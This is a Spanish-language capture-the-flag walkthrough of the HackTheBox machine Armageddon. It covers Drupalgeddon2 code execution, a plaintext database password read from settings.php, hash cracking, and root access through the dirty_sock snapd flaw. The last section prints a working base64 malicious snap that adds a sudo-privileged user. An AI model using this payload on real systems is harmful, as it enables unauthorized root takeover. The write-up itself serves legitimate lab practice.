---
title: "HackTheBox - Armageddon"
layout: single
excerpt: Este es el "Write-Up" de la máquina **Armageddon** de la plataforma HackTheBox, maquina easy pero nunca esta demas compartir informacion, espero y les guste...  
header:
show_date: true
classes: wide
header:
  teaser: "/assets/images/HTB/Armageddon/Armageddon.png"
  teaser_home_page: true
  icon: "/assets/images/HTB/Armageddon/Armageddon.png"
categories:
  - Walkthrough
tags:
  - htb
  - armageddon
  - mysql

---

# Armageddon

>- `Pasos`
>
>>**1->** Escaneo de la ip con nmap  
>>**2->** Identificar tecnologias de la web  
>>**3->** Conseguir RCE   
>>**4->** Encontrando archivos potenciales  
>>**5->** Mostrando tablas de la base de datos  
>>**6->** Crackear hash del usuario administrador    
>>**7->** Escalando privilegios  
>

***

## Escaneo de la ip con nmap  

> > - nmap  -sSV --min-rate 3000 --open -n -Pn 10.10.10.214   

Agreguemos la **IP(`10.10.10.214`)** al /etc/hosts  
Ya puestos en el navegador accederemos a **armageddon.htb**  
 ![](/assets/images/HTB/Armageddon/a1.png)  

##  Identificar tecnologias de la web

Utilizaremos `whatweb` para identificar que tecnologias usan la web

![](/assets/images/HTB/Armageddon/a2.png)  

Vemos que la web trabaja con un <u>drupal version 7</u>.Una version muy desactualizada.  

## Conseguir RCE

Para conseguir ejecuion remota de comandos acudiremos al exploit `drupalgeddon_2` el cual podemos usar de manera automatica mediante **metasploit framework**

![](/assets/images/HTB/Armageddon/a3.png)  
Una vez seteado los parametros **rhosts**, **rport** y **lhost**(ip_HTB)  obtendremos un meterpreter  

Luego de obtener una terminal de meterpreter nos iremos a una shell.

## Encontrando archivos potenciales

En el directorio <u>/var/www/html/sites/default/</u>  encontraremos un archivo de configuracion llamado `settings.php`. 

> cat setttings.php

![](/assets/images/HTB/Armageddon/a4.png)  
Como observan tenemos usuario, contraseña y el nombre del host.con los cuales podemos acceder a la base de datos.

## Mostrando tablas de la base de datos



```bash
mysql -u drupaluser -h localhost -pCQHEy@9M*m23gBVj
use drupal;
select * from users;
show;
```

![](/assets/images/HTB/Armageddon/a5.png)  

Obtuvimos el hash de la  contraseña del usuario <u>brucetherealadmin</u>  

## Crackear hash del usuario administrador 

Le pasaremos el rockyou.txt  

![](/assets/images/HTB/Armageddon/a6.png)  

Posteriormente accederemos por **ssh** 

![](/assets/images/HTB/Armageddon/a7.png)  

##  Escalando privilegios

![](/assets/images/HTB/Armageddon/a8.png)  

*Identificar* la version de <u>snap</u>  

![](/assets/images/HTB/Armageddon/a9.png)

`CVE-2019-7304`

Ahora nos creamos un .snap malicioso para luego instalarlo 

```bash
python2 -c 'print  "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > root.snap
sudo /usr/bin/snap install --devmode root.snap
su dirty_sock
passwd: dirty_sock
```
**Nota:** A veces la instalacion de .snap malicioso tiende a demorarse por lo que seria bueno entrar mediante ssh otra vez y repetir el proceso  
Siendo el usuario `dirty_sock` solo resta:

```
sudo -s
password: dirty_sock
```

Y ya somos **ROOT**

![](/assets/images/HTB/Armageddon/a10.jpg)    

- [x] **H@ppY H@(K1NG!**

